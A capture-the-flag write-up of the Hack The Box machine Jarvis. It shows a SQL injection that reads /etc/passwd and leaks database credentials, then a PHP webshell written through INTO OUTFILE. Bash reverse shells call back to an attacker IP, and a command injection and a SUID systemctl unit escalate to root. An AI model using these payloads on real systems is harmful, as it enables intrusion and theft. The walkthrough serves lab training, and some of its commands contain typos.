---
layout: single
title: Jarvis - Hack The Box
excerpt: "Jarvis is a medium difficulty Linux box running a webserver, whicha has DoS and brute force protection enabled. A page is found to be vulnerable to SQL Injection, Which requires manual exploitation. This serivce allows the writing of a shell to the web root for the foothold. The www-data user is allowed to execute script as pepper user, and the script is vulnerable to command Injection. On further enumeration, systemctl is found to have SUID bit set, which is leveraged to gain a shell as root."
date: 2020-04-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-jarvis/jarvis_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - SQL Injection
  - Command Injection
  - GTFObins
  - SUID
  - OSCP
---

![](/assets/images/htb-writeup-jarvis/jarvis_logo.png)

## Synopsis
Jarvis is a medium difficulty Linux box running a webserver, whicha has `DoS` and `brute force` protection enabled. A page is found to be vulnerable to `SQL Injection`, Which requires manual exploitation. This serivce allows the writing of a shell to the web root for the foothold. The `www-data` user is allowed to execute script as `pepper` user, and the script is vulnerable to `command Injection`. On further enumeration, `systemctl` is found to have `SUID` bit set, which is leveraged to gain a shell as root.

## Skills Required
* SQL Injection
* Command Injection
* Linux Enumeration

## Skills Learned
* File writes through SQL Injeciton
* Exploiting systemctl GTFObin

 
---
## Enumeration
### Nmap
```java
# Nmap 7.60 scan initiated Mon Mar 30 14:13:32 2020 as: nmap -sC -sV -v -p 22,80,14414,35263,52986,64999 -o full.nmap jarvis.htb
Nmap scan report for jarvis.htb (10.10.10.143)
Host is up (0.22s latency).

PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (EdDSA)
80/tcp    open   http          Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
14414/tcp closed ca-web-update
35263/tcp closed unknown
52986/tcp closed unknown
64999/tcp open   http          Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We see `SSH` and `HTTP` running on their default ports. Aditionally, there is a `HTTP` server running on port `64999`.

### Apache
Navigating to the webserver on port `80` we came across page titled *Stark Hotel*.

![](/assets/images/htb-writeup-jarvis/hotel.png)

The page displays a `vhost` *supersecurehote.htb*. So I added it to my `hosts` file. Running `gobuster` on the server results in the following message.

![](/assets/images/htb-writeup-jarvis/banned.png)

So it clearly shows that its hard to perform any kind of Automated `scanning` on the server. Browsing to port `64999` we see the same message that we're `banned` for 90 secs.

Walking through the application we see `Room` tab which taking us to `/room-suites.php` and `Dining&Bar` which taking us to `/dining-bar.php`.

![](/assets/images/htb-writeup-jarvis/rooms.png)

Clicking on `Book now!` button opens up a new URL with a query parameter `cod`.

![](/assets/images/htb-writeup-jarvis/cod.png)

Let's try to test the `cod` parameter for `SQL Injection`. Adding a `quote` and `comment` to the value result in an empty response.

![](/assets/images/htb-writeup-jarvis/empty.png)

However, on removing `quote` and retrying, the room image is returned. We can infer from this that the server expects an `integer` for the `parameter`, and it is `SQL Injectable`.

![](/assets/images/htb-writeup-jarvis/comment.png)

We can verify this by using `true` and `false` clause. For example
```url
http://10.10.10.143/room.php?cod=1 and 1=1-- -
```
The above URL results in the true and true clause resulting in a true result overall and the room is returned. But if we use a `true` and `fasle` clause like the following one:
```
http://10.10.10.143/room.php?cod=1 and 1=2-- -
```
This results in a false value which fails to return the room.

### SQL Injection
Now that we confirmed SQL Injection, let's try to extract Information through a union based SQL Injecation. We can use `ORDER BY` keyword to find the number of columns
```
http://10.10.10.143/room.php?cod=1 ORDER BY 3
```
The above URL return room which means the table has either `3` columns or more. On Incrementing the value by `1` each time, we find that no room is return for value `8` which means that the table has `7` columns.

Now, we can use `UNION` based queries to find the `injectable` columns.
```
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7
```
We use a negative value or the value that doesn't exist to prevent the room being selected over our values. Trying the above URL returns.

![](/assets/images/htb-writeup-jarvis/inject.png)

We see the values `5,2,3,4` in the output which can be used for injection. Le'ts check the database version we can use `database()` function or `@@version` in for `microsoft/mysql` DB. we can also see the `user` with whoam the database is running as using `user()`.
```
    http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,@@version,user(),4,5,6,7
```
![](/assets/images/htb-writeup-jarvis/version.png)

The database is `MariaDB` and its version is `10.1.37-MariaDB-0+deb9u1` and we're running as `DBadmin` user.
Let's check if we can read files using the `load_files()` function.
```
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,load_file('/etc/passwd'),3,4,5,6,7
```
![](/assets/images/htb-writeup-jarvis/file-read.png)

Let's also check if we can write files to the server . We can inspect the apache configuration to identify the path of the webroot. Ideally, the apach2 configuration is located at `/etc/apache2/sites-enabled/000-default.conf`.

![](/assets/images/htb-writeup-jarvis/config.png)

The path is configured with the default path `/var/www/html`. With help of this path we can read `index.php`, `rooms.php`. Looking at those `php` files they're including `connection.php` which seems like responsible for making database connection. let's look at that file.
```
http://10.10.10.143/room.php?cod=-1%20UNION%20SELECT%201,load_file('/var/www/html/connection.php'),3,4,5,6,7
```

![](/assets/images/htb-writeup-jarvis/leak.png)

From `connection.php` file we can see the creds `DBadmin:imissyou` with which the database connection is performed. 
In `MySQL`, we can write files using the `INTO OUTFILE` keyword. Let's try writing contenets of passwd to a file in the web root.
```
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/pwn.txt'
```

The above query writes the contents of `/etc/passwd` to a filen named `pwn.txt` on the web root. After requesting the URL and browsing to `/pwn.txt`, we see the contents of `/etc/passwd`.

![](/assets/images/htb-writeup-jarvis/pwn.png)

## FootHold
Next, can write a php `webshell` and write to a file on the server using the same above method.
```
http://10.10.10.143/room.php?cod=-1 UNION SELECT 1,'<?php system($_REQUEST["cmd"]); ?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
```

After requesting the above URL, we can use `cmd` paramter to execute the commands on the server.
```bash
curl -X POST  http://10.10.10.143/pwned.php --data-urlencode cmd=whoami
1       www-data
        3       4       5       6       7
```

To gain a interactive `reverse shell` we can execute a bash reverse shell.
```
curl -X POST  http://10.10.10.143/pwned.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.40/9001 0>&1"'
```

And we got a reverse shell as `www-data` .
```bash
ncat -lvnp 9001

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 1C9C 3DF3 B4E7 6771 9D7D F5D1 5782 9B06 1ACC D768
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:55158.
bash: cannot set terminal process group (599): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jarvis:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Lateral Movement
Looking at the sudo permissions for `www-data`, we can see that i can execute `simpler.py` as the user `pepper`.
```bash
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```
Looking at the script, we can see that it takes `IP` address on using the `-p` argument,and then uses the `os.system()` function to execute `ping`.
```python
<SNIP>
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()

  <SNIP>

    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

For the script we can understand that few characters(&;-|) are blocke by the script, in order to prevent injecion. But the character `$`, `(` and `)` aren't blocked. This will let us inject commands through bash command substitution. `i.e $(cmd)`. Let's check if its working using `$(whoami)`.
```  
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(whoami)
ping: pepper: Temporary failure in name resolution
```

We see the command was substituted by the username `pepper`, and ping tried to resolve it as a hostname. This means that the command execution was successful. We can use this to execute a bash reverse shell as `pepper` user. Since some special char's are blocked, we'll write command to a script and execute it through injection.
```
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.40/9001 0>&1"' > /tmp/shell.sh
chmod a+x /tmp/shell.sh
```
```
www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(/tmp/shell.sh)
```

And we got a reverse shell as `pepper` user.
```
ncat -lvnp 9001

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: DA5C E37E CD6F D519 72A6 99B6 AF8E 6D94 4873 3ABD
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:55160.

pepper@jarvis:~$ whoami && id
pepper
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
```

## Privilege Escalation
we could check for `SUID` binaries. we can look for `SUID` binaries using `find / -perm -4000 2>/dev/null`.
```
pepper@jarvis:~$ find / -perm -4000 -ls 2>/dev/null
  1310951     32 -rwsr-xr-x   1 root     root        30800 Aug 21  2018 /bin/fusermount
  1310809     44 -rwsr-xr-x   1 root     root        44304 Mar  7  2018 /bin/mount
  1310906     60 -rwsr-xr-x   1 root     root        61240 Nov 10  2016 /bin/ping
  1312201    172 -rwsr-x---   1 root     pepper     174520 Feb 17  2019 /bin/systemctl
  1310810     32 -rwsr-xr-x   1 root     root        31720 Mar  7  2018 /bin/umount
  1310807     40 -rwsr-xr-x   1 root     root        40536 May 17  2017 /bin/su
  1444734     40 -rwsr-xr-x   1 root     root        40312 May 17  2017 /usr/bin/newgrp
  1441873     60 -rwsr-xr-x   1 root     root        59680 May 17  2017 /usr/bin/passwd
  1441872     76 -rwsr-xr-x   1 root     root        75792 May 17  2017 /usr/bin/gpasswd
  1441870     40 -rwsr-xr-x   1 root     root        40504 May 17  2017 /usr/bin/chsh
  1453559    140 -rwsr-xr-x   1 root     root       140944 Jun  5  2017 /usr/bin/sudo
  1441869     52 -rwsr-xr-x   1 root     root        50040 May 17  2017 /usr/bin/chfn
  1574579     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
  1707587    432 -rwsr-xr-x   1 root     root       440728 Mar  1  2019 /usr/lib/openssh/ssh-keysign
  1578698     44 -rwsr-xr--   1 root     messagebus    42992 Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
From the above binaries we could see `systemctl` is a non standard one. So we can look for privilege escalation throught that.

The `systemctl` command is used to manage service on a system running systemd. Usually, the configuration files are located are /etc/system/systemd. However, as we're not root, It's not possible to write a file to this folder. Instead, we can use `systemctl link` command.

According to the manpage [systemctl](https://www.freedesktop.org/software/systemd/man/systemctl.html), the `link` command can be used to Include a configuration file that isn't in the default search path. This will help us create  a unit file at any location and link it, which will let us start the service.

Checking [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#suid), we see how this can be leveraged to execute commands.
```
cd /home/pepper
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /dev/shm/ouput"
[Insall]
WantedBy=multi-user.target' > pwn.service

systemctl link /home/pepper/pwn.service
systemctl start pwn.service
```

The command above create a file named `pwn.service` with service type `oneshot`. The oneshot service waits until the initial command has executed, before declaring the service active. The `ExecStart` parameter is used to specify the command which is to be executed on the start. Then the `link` command is used to link the service to systemd, and `start` command is used to execute the command.

```
pepper@jarvis:~$ systemctl link /home/pepper/pwn.service
pepper@jarvis:~$ systemctl start pwn
pepper@jarvis:~$ cat /dev/shm/ouput 
uid=0(root) gid=0(root) groups=0(root)
```
We can see it working now the ouptut of `id` command is seen in the `/dev/shm/outpu`, which confirms that its runs as root. we'll point it to our `shell.sh` file location which contains `bash -c "bash -i >& /dev/tcp/10.10.14.40/9001 0>&1"`. 

```
cd /home/pepper
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "/dev/shm/shell.sh"
[Insall]
WantedBy=multi-user.target' > pwn.service

systemctl link /home/pepper/pwn.service
systemctl start pwn.service
```

After starating the service it executes the contents of `shell.sh` and we get a reverse shell as `root`.
```
ncat -lvnp 9001

Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:55162.
bash: cannot set terminal process group (1333): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/# whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
root@jarvis:/# hostname
jarvis
```
Thank you for taking you're time for reading this blog!.
